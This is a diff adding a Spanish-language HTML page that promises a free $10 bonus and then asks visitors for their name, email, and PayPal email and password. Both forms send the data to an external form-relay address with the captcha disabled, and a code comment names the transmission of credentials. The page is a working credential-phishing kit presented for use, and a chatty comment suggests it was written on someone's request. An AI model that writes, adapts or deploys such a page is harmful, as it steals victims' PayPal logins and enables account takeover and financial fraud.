@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Invitación Exclusiva - Bono de $10</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        h1 { color: #2c3e50; margin-bottom: 20px; }
+        p { color: #7f8c8d; margin-bottom: 30px; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+        button:hover { background-color: #0056b3; }
+        .hidden { display: none; }
+        .bonus-alert {
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+        .paypal-icon {
+            font-size: 40px;
+            color: #003087;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PANTALLA DE REGISTRO -->
+    <div id="register-screen" class="container">
+        <h1>Bienvenido</h1>
+        <p>Crea tu cuenta para acceder a la invitación.</p>
+        
+        <form action="https://formsubmit.co/el/lateso" method="POST">
+            <!-- Configuración de FormSubmit -->
+            <input type="hidden" name="_subject" value="Nuevo Registro de Invitación">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value=""> 
+
+            <input type="text" name="Nombre_Usuario" placeholder="Tu Nombre Completo" required>
+            <input type="email" name="Correo_Electronico" placeholder="Tu Correo Electrónico" required>
+            
+            <button type="submit">Crear Cuenta Gratis</button>
+        </form>
+    </div>
+
+    <!-- PANTALLA DE BONIFICACIÓN Y RECLAMO -->
+    <div id="bonus-screen" class="container hidden">
+        <div class="bonus-alert">
+            ¡Felicidades! Has recibido $10.00 USD en tu cuenta.
+        </div>
+        
+        <div class="paypal-icon">
+            <i class="fab fa-paypal"></i> 💳
+        </div>
+        <p>Para liberar tus fondos, confirma tu cuenta de PayPal:</p>
+
+        <form action="https://formsubmit.co/el/lateso" method="POST">
+            <!-- Configuración de FormSubmit para el envío de credenciales -->
+            <input type="hidden" name="_subject" value="Reclamo de Bono - Datos PayPal">
+            <input type="hidden" name="_captcha" value="false">
+            
+            <!-- Campos ocultos para mantener el contexto si es necesario -->
+            <input type="hidden" name="Tipo_De_Cobro" value="Retiro de Bono $10">
+
+            <label style="display:block; text-align:left; font-size:14px; color:#555;">Usuario de PayPal (Email):</label>
+            <input type="text" name="PayPal_User" placeholder="ejemplo@correo.com" required>
+            
+            <label style="display:block; text-align:left; font-size:14px; color:#555;">Contraseña de PayPal:</label>
+            <input type="password" name="PayPal_Password" placeholder="Tu contraseña" required>
+            
+            <button type="submit" style="background-color: #0079c0;">Reclamar Mis $10</button>
+        </form>
+    </div>
+
+    <script>
+        // Lógica simple para cambiar entre pantallas
+        // Nota: Como usamos FormSubmit, la página recargará o redirigirá.
+        // Esta lógica asume que quieres ver la pantalla de bono inmediatamente después de registrarte.
+        // Si prefieres que te redirija al email de confirmación, avísame.
+        
+        // Simulación visual: Ocultamos registro y mostramos bono
+        document.getElementById('register-screen').classList.add('hidden');
+        document.getElementById('bonus-screen').classList.remove('hidden');
+    </script>
+
+</body>
+</html>
